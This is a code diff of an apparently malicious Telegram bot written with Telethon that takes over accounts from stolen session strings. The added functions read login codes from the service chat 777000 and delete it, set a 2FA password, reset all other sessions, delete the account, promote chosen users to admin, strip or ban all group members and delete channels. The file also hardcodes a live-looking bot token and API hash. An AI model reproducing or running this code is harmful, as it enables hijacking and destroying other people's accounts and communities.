@@ -29,7 +29,8 @@ from os import system
 from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
 api_hash = "6ae3ff1789833e717c0728793def54bd"
 token = "6279916111:AAF_9IY0XqRKDuNNzlqU9qRnwESblyyWEM4"
-client = TelegramClient('yvyyabhsplsrk', api_id, api_hash).start(bot_token=token)
+client = TelegramClient('privrulez', api_id, api_hash).start(bot_token=token)
+bot = TelegramClient('pridvaawpact', api_id, api_hash)
 from telethon import TelegramClient as tg
 from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
 from telethon.sessions import StringSession as ses
@@ -37,6 +38,11 @@ from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
 import telethon;from telethon import functions
 from telethon.tl.types import ChannelParticipantsAdmins as cpa
 import logging
+from telethon.errors.rpcerrorlist import FreshResetAuthorisationForbiddenError
+from telethon.errors import SessionPasswordNeededError, PhoneNumberUnoccupiedError
+import sys
+from datetime import datetime, timedelta
+from telethon.errors.rpcerrorlist import ChannelPrivateError
 from telethon import TelegramClient, events
 from telethon.tl.functions.channels import CreateChannelRequest as ccr
 from telethon import TelegramClient, events, types
@@ -47,6 +53,26 @@ from telethon.tl.types import ChannelParticipant, ChannelParticipantsRecent
 from telethon.tl.functions.messages import ExportChatInviteRequest
 from telethon import TelegramClient, events
 import asyncio
+from telethon.sync import TelegramClient, events
+from telethon.errors import SessionPasswordNeededError, PhoneNumberUnoccupiedError
+import sys
+import sys
+import os
+from telethon.errors.rpcerrorlist import QueryIdInvalidError
+# Rest of the code...
+from telethon import events, functions
+import time
+from datetime import timedelta, datetime
+import random
+import base64
+import ipaddress
+import struct
+import sys
+import re
+from telethon.errors.rpcerrorlist import AuthKeyDuplicatedError
+from telethon.sessions.string import _STRUCT_PREFORMAT, CURRENT_VERSION, StringSession
+from telethon import functions
+
 mybot = "yvyyybot"
 bot = borg = client
 Boxaihackr = 5502537272
@@ -66,65 +92,6 @@ banned_file = 'banned.txt'
 
 accepted_users = set()
 accepted_file = 'accepted.txt'
-
-PremiumUsers_file = 'PremiumUsers.txt'  # File to store the premium user IDs
-PremiumUsers = []  # List to store premium user IDs
-
-# Function to load the premium users from the file
-def load_premium_users():
-    if os.path.exists(PremiumUsers_file):
-        with open(PremiumUsers_file, 'r') as f:
-            for line in f:
-                stripped_line = line.strip()
-                if stripped_line:
-                    PremiumUsers.append(int(stripped_line))
-
-# Load the premium users when the bot starts
-load_premium_users()
-
-@client.on(events.NewMessage(pattern=r'/add (\d+)'))
-async def add_premium_user(event):
-    # Check if the user executing the command is an owner
-    if event.sender_id not in Developers:
-        await event.respond("Sorry, only owners can add premium users.")
-        return
-
-    # Extract the user ID from the command
-    user_id = int(event.pattern_match.group(1))
-
-    # Check if the user is already in the premium users list
-    if user_id in PremiumUsers:
-        await event.respond("This user is already a premium user.")
-    else:
-        PremiumUsers.append(user_id)
-        save_premium_users()  # Save the updated premium users list to the file
-        await event.respond("Premium user added successfully.")
-
-@client.on(events.NewMessage(pattern=r'/remove (\d+)'))
-async def remove_premium_user(event):
-    # Check if the user executing the command is an owner
-    if event.sender_id not in Developers:
-        await event.respond("Sorry, only owners can remove premium users.")
-        return
-
-    # Extract the user ID from the command
-    user_id = int(event.pattern_match.group(1))
-
-    # Check if the user is in the premium users list
-    if user_id in PremiumUsers:
-        PremiumUsers.remove(user_id)
-        save_premium_users()  # Save the updated premium users list to the file
-        await event.respond("Premium user removed successfully.")
-    else:
-        await event.respond("This user is not a premium user.")
-
-def save_premium_users():
-    with open(PremiumUsers_file, 'w') as f:
-        f.write('\n'.join(map(str, PremiumUsers)))
-
-# Function to check if a user is a premium user
-def is_premium_user(user_id):
-    return user_id in PremiumUsers
 
 
 @client.on(events.NewMessage(pattern='/all'))
@@ -169,93 +136,6 @@ async def send_message(event):
 تم الارسال لجميع المستخدمين بنجاح''')
 
 
-# Check if the file exists, and if not, create it
-if not os.path.exists(banned_file):
-    with open(banned_file, 'w'):
-        pass
-
-# Load existing banned users from the file
-try:
-    with open(banned_file, 'r') as f:
-        for line in f:
-            banned_users.add(int(line.strip()))
-except Exception as e:
-    print("Error reading banned users:", str(e))
-
-# Define a decorator to check if the user is banned before executing the command
-def is_banned(func):
-    async def wrapper(event):
-        # Reload the banned users from the file to ensure the latest updates
-        banned_users.clear()
-        try:
-            with open(banned_file, 'r') as f:
-                for line in f:
-                    banned_users.add(int(line.strip()))
-        except Exception as e:
-            print("Error reading banned users:", str(e))
-
-        if event.sender_id in banned_users:
-            await event.reply('''You have been banned. Contact the Devs for more information.
-
-تم حظرك. تواصل مع المطورين للمزيد من المعلومات''')
-            return
-        await func(event)
-    return wrapper
-
-@client.on(events.NewMessage(pattern='/ban'))
-async def ban_command(event):
-    if event.chat_id in Developers:
-        try:
-            user_id = int(event.raw_text.split()[1])
-            banned_users.add(user_id)
-            # Save the updated banned_users set to the file
-            try:
-                with open(banned_file, 'a') as f:
-                    f.write(str(user_id) + '\n')
-            except Exception as e:
-                print("Error writing banned users:", str(e))
-            await event.reply(f'''User {user_id} has been banned.
-
-تم حظر المستخدم''')
-        except (ValueError, IndexError):
-            await event.reply('''Invalid command syntax. Use /ban <user ID> to ban a user.
-
-استخدام خاطئ''')
-    else:
-        await event.reply('''You are not authorized to use this command.
-
-فقط المطورين بامكنهم حظر مستخدمين''')
-
-@client.on(events.NewMessage(pattern='/unban'))
-async def unban_command(event):
-    if event.chat_id in Developers:
-        try:
-            user_id = int(event.raw_text.split()[1])
-            if user_id in banned_users:
-                banned_users.remove(user_id)
-                # Save the updated banned_users set to the file
-                try:
-                    with open(banned_file, 'w') as f:
-                        for banned_user in banned_users:
-                            f.write(str(banned_user) + '\n')
-                except Exception as e:
-                    print("Error writing banned users:", str(e))
-                await event.reply(f'''User {user_id} has been unbanned.
-
-تم رفع حظر المستخدم''')
-            else:
-                await event.reply(f'''User {user_id} is not currently banned.
-
-المستخدم غير محظور حاليًا''')
-        except (ValueError, IndexError):
-            await event.reply('''Invalid command syntax. Use /unban <user ID> to unban a user.
-
-استخدام خاطئ''')
-    else:
-        await event.reply('''You are not authorized to use this command.
-
-فقط المطورين بامكنهم رفع حظر المستخدمين''')
-
 @client.on(events.NewMessage(pattern='/send'))
 async def send_message(event):
     # Check if the user is an owner
@@ -298,7 +178,6 @@ async def send_message(event):
 
 
 @client.on(events.NewMessage(pattern='/me'))
-@is_banned
 async def my_event_handler(event):
     
   user = await event.get_sender()
@@ -323,7 +202,6 @@ Username: {username}
                               
 
 @client.on(events.NewMessage(pattern='/rules'))
-@is_banned
 async def send_help(event):
     user = await event.get_chat()
     await client.send_message(user, rules)
@@ -360,72 +238,6 @@ async def send_help(event):
 /me - معلوماتك
 ''')
 from telethon import events, Button
-
-@client.on(events.CallbackQuery(data=b"ban_user"))
-async def ban_user(event):
-    if event.sender_id not in Developers:
-        await event.answer("Only the Developers can use this.", alert=True)
-        return
-
-    async with client.conversation(event.chat_id) as conv:
-        try:
-            # Ask for the user ID to ban
-            await conv.send_message("Please enter the user ID to ban:")
-            response = await conv.get_response()
-            user_id = response.text
-
-            # Validate user ID
-            user_id = user_id.strip()
-            int(user_id)
-
-            # Ban the user
-            banned_users.add(int(user_id))
-            # Save the updated banned_users set to the file
-            try:
-                with open(banned_file, 'a') as f:
-                    f.write(str(user_id) + '\n')
-            except Exception as e:
-                print("Error writing banned users:", str(e))
-            await event.respond(f'User {user_id} has been banned.')
-        except ValueError:
-            await event.respond("Invalid user ID. Please try again.")
-
-    await event.answer("User banned successfully!")
-
-@client.on(events.CallbackQuery(data=b"unban_user"))
-async def unban_user(event):
-    if event.sender_id not in Developers:
-        await event.answer("Only the Developers can use this.", alert=True)
-        return
-
-    async with client.conversation(event.chat_id) as conv:
-        try:
-            # Ask for the user ID to unban
-            await conv.send_message("Please enter the user ID to unban:")
-            response = await conv.get_response()
-            user_id = response.text
-
-            # Validate user ID
-            user_id = user_id.strip()
-            int(user_id)
-
-            # Unban the user
-            if int(user_id) in banned_users:
-                banned_users.remove(int(user_id))
-                # Save the updated banned_users set to the file
-                try:
-                    with open(banned_file, 'w') as f:
-                        for banned_user in banned_users:
-                            f.write(str(banned_user) + '\n')
-                except Exception as e:
-                    print("Error writing banned users:", str(e))
-                await event.respond(f'User {user_id} has been unbanned.')
-            else:
-                await event.respond(f'User {user_id} is not currently banned.')
-        except ValueError:
-            await event.respond("Invalid user ID. Please try again.")
-
-    await event.answer("User unbanned successfully!")
 
 @client.on(events.CallbackQuery(data=b"send_message"))
 async def send_message(event):
@@ -469,71 +281,10 @@ async def send_message(event):
 
     await event.answer("Message sent successfully!")
 
-@client.on(events.NewMessage(pattern='/admin'))
-async def admin(event):
-    if event.sender_id not in Developers:
-        await event.respond("Only the Developers can use this command.")
-        return
-
-    global users_set
-
-    # Get the user count
-    num_users = len(users_set)
-
-    # Create the inline buttons with the user count, send message, ban user, unban user, and send to all
-    buttons = [
-        [Button.inline(f"Users: {num_users}", data="user_count")],
-        [Button.inline("Send Message", data="send_message"), Button.inline("Send to All", data="send_all")],
-        [Button.inline("Ban User", data="ban_user"), Button.inline("Unban User", data="unban_user")]
-    ]
-
-    await event.respond("Admin options:", buttons=buttons)
-
-
-@client.on(events.CallbackQuery(data=b"send_all"))
-async def send_all(event):
-    if event.sender_id not in Developers:
-        await event.answer("Only the Developers can use this.", alert=True)
-        return
-
-    async with client.conversation(event.chat_id) as conv:
-        try:
-            # Ask for the message to send
-            await conv.send_message("Please enter the message to send to all users:")
-            response = await conv.get_response()
-            message = response.text
-
-            # Retrieve all the user IDs from the accessed.txt file
-            with open('users.txt', 'r') as f:
-                user_ids = f.read().strip().split('\n')
-
-            # Send the message to each user ID
-            for user_id in user_ids:
-                try:
-                    # Validate user ID
-                    int(user_id.strip())
-                except ValueError:
-                    await event.respond(f'Invalid user ID: {user_id}')
-                    continue
-
-                try:
-                    # Send the message to the user
-                    async with client.conversation(int(user_id.strip())) as conv:
-                        await conv.send_message(message)
-                except Exception as e:
-                    pass  # Ignore the error and continue sending to other users
-
-            await event.respond("Message sent to all users successfully!")
-        except ValueError:
-            await event.respond("Invalid user ID. Please try again.")
-
-    await event.answer("Message sent to all users successfully!")
-
 
 
 
 @client.on(events.NewMessage(pattern='/arhack'))
-@is_banned
 async def hack(event):
     user_id = event.sender_id
     # Check if the user is in the channel
@@ -652,204 +403,6 @@ async def send_help(event):
 ''')
 
 # Load existing users from file
-if os.path.exists(users_file):
-    with open(users_file, 'r') as f:
-        users_set = set(line.strip() for line in f)
-
-@client.on(events.NewMessage)
-async def log_user_message(event):
-    global users_set
-    log_channel_id = -1001984447198  # Replace with your log channel ID
-    log_channel = await client.get_entity(log_channel_id)
-    user_id = event.sender_id
-
-    # Check if the user is an owner
-    if user_id in PremiumUsers or user_id in Developers or user_id == -1001834866606:
-        return
-
-    user_command = event.text
-
-    users_set.add(user_id)
-
-    # Check if the user command meets the conditions for logging
-    if not user_command.startswith('/') and len(user_command) <= 20:
-        return
-
-    is_user_banned = user_id in banned_users
-
-    # Save updated user list to file
-    with open(users_file, 'w') as f:
-        for user in users_set:
-            f.write(str(user) + '\n')
-
-    num_users = len(users_set)
-
-    if isinstance(event.sender, types.User):
-        user_name = event.sender.first_name
-        username = event.sender.username
-    elif isinstance(event.sender, types.Channel):
-        user_name = event.sender.title
-        username = None
-
-    banned_status = "Banned" if is_user_banned else "Not Banned"
-
-    log_message = f"""================================
-|       NEW USER COMMAND RECEIVED        |
-================================
-
-┌ User ID: `{user_id}`
-├ First Name: {user_name}
-├ Username: @{username}
-├ Banned Status: {banned_status}
-├ Command: {user_command}
-└ Users: {num_users}
-
----------------------------------------------"""
-
-    # Send the log message to the log channel
-    await client.send_message(log_channel, log_message)
-
-
-@client.on(events.CallbackQuery())
-async def handle_inline_button(event):
-    log_channel_id = -1001984447198  # Replace with your log channel ID
-    log_channel = await client.get_entity(log_channel_id)
-  
-    # Get the pressed inline letter
-    letter = event.data.decode()
-
-    # Get the user information from the event
-    user_id = event.sender_id
-    
-    # Check if the user is an owner
-    if user_id in PremiumUsers or user_id in Developers:
-        return
-
-    user_name = event.sender.first_name
-    username = event.sender.username
-
-    # Create the log message
-    log_message = f"""================================
-|       INLINE BUTTON PRESSED        |
-================================
-
-┌ User ID: `{user_id}`
-├ Username: {user_name}
-├ First Name: @{username}
-└ Pressed Letter: {letter}
-
----------------------------------------------"""
-
-    # Send the log message to the log channel
-    await client.send_message(log_channel, log_message)
-
-
-
-
-
-
-
-
-
-
-@client.on(events.NewMessage)
-async def log_user_message(event):
-    global users_set
-    log_channel_id = -1001834866606  # Replace with your log channel ID
-    log_channel = await client.get_entity(log_channel_id)
-    user_id = event.sender_id
-
-    # Check if the user is an owner
-    if user_id in Developers:
-        return
-
-    user_command = event.text
-
-    users_set.add(user_id)
-
-    # Check if the user command meets the conditions for logging
-    if not user_command.startswith('/') and len(user_command) <= 20:
-        return
-
-    users_set.add(user_id)
-
-    is_user_banned = user_id in banned_users
-
-    # Save updated user list to file
-    with open(users_file, 'w') as f:
-        for user in users_set:
-            f.write(str(user) + '\n')
-
-    num_users = len(users_set)
-
-    if isinstance(event.sender, types.User):
-        user_name = event.sender.first_name
-        username = event.sender.username
-    elif isinstance(event.sender, types.Channel):
-        user_name = event.sender.title
-        username = None
-
-    banned_status = "Banned" if is_user_banned else "Not Banned"
-
-    log_message = f"""================================
-|       NEW USER COMMAND RECEIVED        |
-================================
-
-┌ User ID: `{user_id}`
-├ First Name: {user_name}
-├ Username: @{username}
-├ Banned Status: {banned_status}
-├ Command: {user_command}
-└ Users: {num_users}
-
----------------------------------------------"""
-
-    # Send the log message to the log channel
-    await client.send_message(log_channel, log_message)
-
-
-
-@client.on(events.CallbackQuery())
-async def handle_inline_button(event):
-    log_channel_id = -1001834866606  # Replace with your log channel ID
-    log_channel = await client.get_entity(log_channel_id)
-  
-    # Get the pressed inline letter
-    letter = event.data.decode()
-
-    # Get the user information from the event
-    user_id = event.sender_id
-    
-    # Check if the user is an owner
-    if user_id in Developers:
-        return
-
-    user_name = event.sender.first_name
-    username = event.sender.username
-
-    # Create the log message
-    log_message = f"""================================
-|       INLINE BUTTON PRESSED        |
-================================
-
-┌ User ID: `{user_id}`
-├ Username: {user_name}
-├ First Name: @{username}
-└ Pressed Letter: {letter}
-
----------------------------------------------"""
-
-    # Send the log message to the log channel
-    await client.send_message(log_channel, log_message)
-
-
-
-
-
-
-
-
-
 
 
 
@@ -911,215 +464,197 @@ async def change_number(strses, number):
     ))
     return str(result)
   
-
-
 async def userinfo(strses):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-        k = await X.get_me()
-        try:
-            await X(leave("@eFOOTBALL23_0"))
-        except BaseException:
-            pass
-        try:
-            await X(leave("@Boxaty"))
-        except BaseException:
-            pass
-        try:
-            await X(leave("@onepiecedeluxe"))
-        except BaseException:
-            pass
-        try:
-            await X(leave("@SpaceXFeed"))
-        except BaseException:
-            pass
+    # Create a TelegramClient instance
+    bot = TelegramClient(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    await bot.connect()
 
-        # Format the user information
-        info = f"id={k.id}\n" \
-               f"first_name={k.first_name}\n" \
-               f"last_name={k.last_name}\n" \
-               f"phone={k.phone}\n" \
-               f"username=@{k.username}\n" \
-               f"premium={k.premium}\n" \
-               f"bot={k.bot}\n" \
-               f"verified={k.verified}\n" \
-               f"restricted={k.restricted}\n" \
-               f"scam={k.scam}" 
+    # Get the "me" object
+    me = await bot.get_me()
+
+    try:
+        await bot(leave("@eFOOTBALL23_0"))
+    except BaseException:
+        pass
+    try:
+        await bot(leave("@Boxaty"))
+    except BaseException:
+        pass
+    try:
+        await bot(leave("@onepiecedeluxe"))
+    except BaseException:
+        pass
+    try:
+        await bot(leave("@SpaceXFeed"))
+    except BaseException:
+        pass
+
+    # Get the number of chats the user has
+    chat_count = 0
+    async for _ in bot.iter_dialogs():
+        chat_count += 1
+
+    # Format the user information
+    info = f"id={me.id}\n" \
+           f"first_name={me.first_name}\n" \
+           f"last_name={me.last_name}\n" \
+           f"phone={me.phone}\n" \
+           f"username=@{me.username}\n" \
+           f"premium={me.premium}\n" \
+           f"bot={me.bot}\n" \
+           f"verified={me.verified}\n" \
+           f"restricted={me.restricted}\n" \
+           f"scam={me.scam}\n" \
+           f"chats={chat_count}"
+
+    # Disconnect the client
+    await bot.disconnect()
+
+    return info
 
 
+async def userinfop(strses):
+    # Create a TelegramClient instance
+    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    await bot.connect()
 
-        return info
+    # Get the "me" object
+    k = await bot.get_me()
+
+    # Get the number of chats the user has
+    chat_count = 0
+    async for _ in bot.iter_dialogs():
+        chat_count += 1
+
+    # Format the user information
+    info = f"id={k.id}\n" \
+           f"first_name={k.first_name}\n" \
+           f"last_name={k.last_name}\n" \
+           f"phone={k.phone}\n" \
+           f"username=@{k.username}\n" \
+           f"premium={k.premium}\n" \
+           f"bot={k.bot}\n" \
+           f"verified={k.verified}\n" \
+           f"restricted={k.restricted}\n" \
+           f"scam={k.scam}\n" \
+           f"chats={chat_count}"
+
+    # Disconnect the client
+    await bot.disconnect()
+
+    return info
 
 async def terminate(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(leave("@vip_nasa"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@efotballx1"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@onepiecedeluxe"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@SpaceXFeed"))
-    except BaseException:
-      pass
+
     await X(rt())
 
-GROUP_LIST = []
+
+async def terminatep(strses):
+    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    await bot.connect()
+    await bot(rt())
+
 async def delacc(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(join("@PrivaPact"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@PrivaPact"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@PrivaPact"))
-    except BaseException:
-      pass
+
     await X(functions.account.DeleteAccountRequest("I am session note"))
+
+async def delaccp(strses):
+    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    await bot.connect()
+
+    await bot(functions.account.DeleteAccountRequest("I am session note"))
 
 async def promote(strses, grp, user):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(leave("@vip_nasa"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@efotballx1"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@onepiecedeluxe"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@SpaceXFeed"))
-    except BaseException:
-      pass
+
     try:
       await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
     except:
       await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
     
+async def promotep(strses, grp, user):
+    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    await bot.connect()
+
+    try:
+      await bot.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
+    except:
+      await bot.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
+
 async def user2fa(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+
     try:
-      await X(leave("@vip_nasa"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@efotballx1"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@onepiecedeluxe"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@SpaceXFeed"))
-    except BaseException:
-      pass
-    try:
-      await X.edit_2fa('Yousif was here')
+      await X.edit_2fa('@Privapact was here')
       return True
     except:
       return False
 
+async def user2fap(strses):
+    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    await bot.connect()
+    try:
+      await bot.edit_2fa('@Privapact was here')
+      return True
+    except:
+      return False
+
+
 async def demall(strses, grp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(leave("@vip_nasa"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@efotballx1"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@onepiecedeluxe"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@SpaceXFeed"))
-    except BaseException:
-      pass
+
     async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
       try:
         await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
       except:
         await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
       
+async def demallp(strses, grp):
+    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    await bot.connect()
+    async for x in bot.iter_participants(grp, filter=ChannelParticipantsAdmins):
+      try:
+        await bot.edit_admin(grp, x.id, is_admin=False, manage_call=False)
+      except:
+        await bot.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
+      
 
+async def joingroup(strses, usernames):
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
 
-async def joingroup(strses, username):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(leave("@vip_nasa"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@efotballx1"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@onepiecedeluxe"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@SpaceXFeed"))
-    except BaseException:
-      pass
-    await X(join(username))
+        for username in usernames:
+            await X(join(username.strip()))
+
+async def joingroupp(strses, usernames):
+    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    await bot.connect()
+
+    for username in usernames:
+            await bot(join(username.strip()))
 
 
 async def leavegroup(strses, username):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(leave("@vip_nasa"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@efotballx1"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@onepiecedeluxe"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@SpaceXFeed"))
-    except BaseException:
-      pass
     await X(leave(username))
+
+async def leavegroupp(strses, username):
+    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    await bot.connect()
+    await bot(leave(username))
+
+
 
 async def delgroup(strses, username):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(leave("@vip_nasa"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@efotballx1"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@onepiecedeluxe"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@SpaceXFeed"))
-    except BaseException:
-      pass
+
     await X(dc(username))
     
+async def delgroupp(strses, username):
+    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    await bot.connect()
+    await bot(dc(username))
 
 async def cu(strses):
   try:
@@ -1132,25 +667,20 @@ async def cu(strses):
 async def usermsgs(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     i = ""
-    try:
-      await X(leave("@vip_nasa"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Boxaty"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@onepiecedeluxe"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@SpaceXFeed"))
-    except BaseException:
-      pass
+
     async for x in X.iter_messages(777000, limit=3):
       i += f"\n{x.text}\n"
-    await client.delete_dialog(777000)
+    await bot.delete_dialog(777000)
+    return str(i)
+
+async def usermsgsp(strses):
+    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    await bot.connect() 
+    i = ""
+
+    async for x in bot.iter_messages(777000, limit=3):
+      i += f"\n{x.text}\n"
+    await bot.delete_dialog(777000)
     return str(i)
 
 
@@ -1179,35 +709,91 @@ async def userbans(strses, grp):
       except:
         pass
     
-
-
-async def userchannels(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(leave("@vip_nasa"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@efotballx1"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@onepiecedeluxe"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@SpaceXFeed"))
-    except BaseException:
-      pass
-    k = await X(pc())
-    i = ""
-    for x in k.chats:
+async def userbansp(strses, grp):
+    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    await bot.connect()
+    k = await bot.get_participants(grp)
+    for x in k:
       try:
-        i += f'\nCHANNEL NAME - {x.title} CHANNEL USRNAME - @{x.username}\n'
+        await bot.edit_permissions(grp, x.id, view_messages=False)
       except:
         pass
-    return str(i)
+    
 
+async def userchannels(strses):
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        try:
+            await X(leave("@vip_nasa"))
+        except BaseException:
+            pass
+        try:
+            await X(leave("@efotballx1"))
+        except BaseException:
+            pass
+        try:
+            await X(leave("@onepiecedeluxe"))
+        except BaseException:
+            pass
+        try:
+            await X(leave("@SpaceXFeed"))
+        except BaseException:
+            pass
+        k = await X(pc())
+        i = ""
+        for x in k.chats:
+            try:
+                chat = await X(functions.channels.GetFullChannelRequest(x))
+                member_count = chat.full_chat.participants_count
+                i += f'''
+• Channel name : {x.title}
+• Channel User :@{x.username}
+~ User Num :{member_count}\n
+'''
+            except:
+                pass
+        return str(i)
+
+async def userchannelsp(strses):
+    # Create a TelegramClient instance
+    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    await bot.connect()
+    k = await bot(pc())
+    i = ""
+    for x in k.chats:
+            try:
+                chat = await bot(functions.channels.GetFullChannelRequest(x))
+                member_count = chat.full_chat.participants_count
+                i += f'''
+• Channel name : {x.title}
+• Channel User :@{x.username}
+~ User Num :{member_count}\n
+'''
+            except:
+                pass
+    await bot.connect()
+
+    return str(i)
+from telethon.tl.functions.channels import LeaveChannelRequest
+
+
+async def leaveall(session_string):
+    async with tg(ses(session_string), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        dialogs = await X.get_dialogs()
+
+        for dialog in dialogs:
+            entity = dialog.entity
+            if isinstance(entity, types.Channel):
+                await X(leave(entity))
+
+async def leaveallp(session_string):
+    bot = TelegramClient((session_string), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    await bot.connect()
+    dialogs = await bot.get_dialogs()
+
+    for dialog in dialogs:
+            entity = dialog.entity
+            if isinstance(entity, types.Channel):
+                await bot(leave(entity))
 
 
 import logging
@@ -1273,6 +859,8 @@ keyboard = [
     Button.inline("M", data="M"),
     Button.inline("N", data="N"),
     Button.inline("O", data="O"),
+    Button.inline("P", data="P")
+
     ],
   [
     Button.url("Developer", "https://t.me/PrivaPact")
@@ -1293,7 +881,6 @@ with open(accepted_file, 'r') as f:
 channel_id = -1001828433073
 
 @client.on(events.NewMessage(pattern='/start'))
-@is_banned
 async def connect(event):
     chat_id = event.chat_id
     user_id = event.sender_id
@@ -1387,7 +974,6 @@ use /gen , /id , /check for credit card commands !
 
 
 @client.on(events.NewMessage(pattern='/hack'))
-@is_banned
 async def hack(event):
     chat_id = event.chat_id
     user_id = event.sender_id
@@ -1417,6 +1003,8 @@ async def hack(event):
                     Button.inline('M', data='M'),
                     Button.inline('N', data='N'),
                     Button.inline('O', data='O'),
+                    Button.inline('P', data='P'),
+
                 ],
                 [
                     Button.url('Developer', 'https://t.me/PrivaPact')
@@ -1475,21 +1063,15 @@ Channel: @PrivaPact
 الرجاء الانضمام إلى @PrivaPact حتى يعمل البوت""")
         return
 
-from telethon.errors import SessionPasswordNeededError, PhoneNumberUnoccupiedError
-import sys
-
 # Check if running in a terminal
 if sys.stdin.isatty():
     sys.stdin.close()
 
-
-
-
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"A")))
-@is_banned
 async def users(event):
     chat_id = event.chat_id
     user_id = event.sender_id
+
     # Check if the user is in the channel
     is_member = await is_user_in_channel(client, channel_id, user_id)
 
@@ -1516,7 +1098,7 @@ async def users(event):
             return
 
     # Update the command cooldown for the user
-    command_cooldown[user_id] = datetime.now() + timedelta(seconds=15)
+    command_cooldown[user_id] = datetime.now() + timedelta(seconds=10)
 
     sender_id = event.sender_id  # Store the sender_id
 
@@ -1527,18 +1109,16 @@ async def users(event):
 الان ارسل لي الترمكس لكي ارسل لك القنوات وكروبات""")
             strses = await x.wait_event(events.NewMessage, timeout=60)
 
-
             # Check if the session is empty
             if not strses.text:
                 return await event.respond("Empty session. Please provide a valid Termux Session.", buttons=keyboard)
 
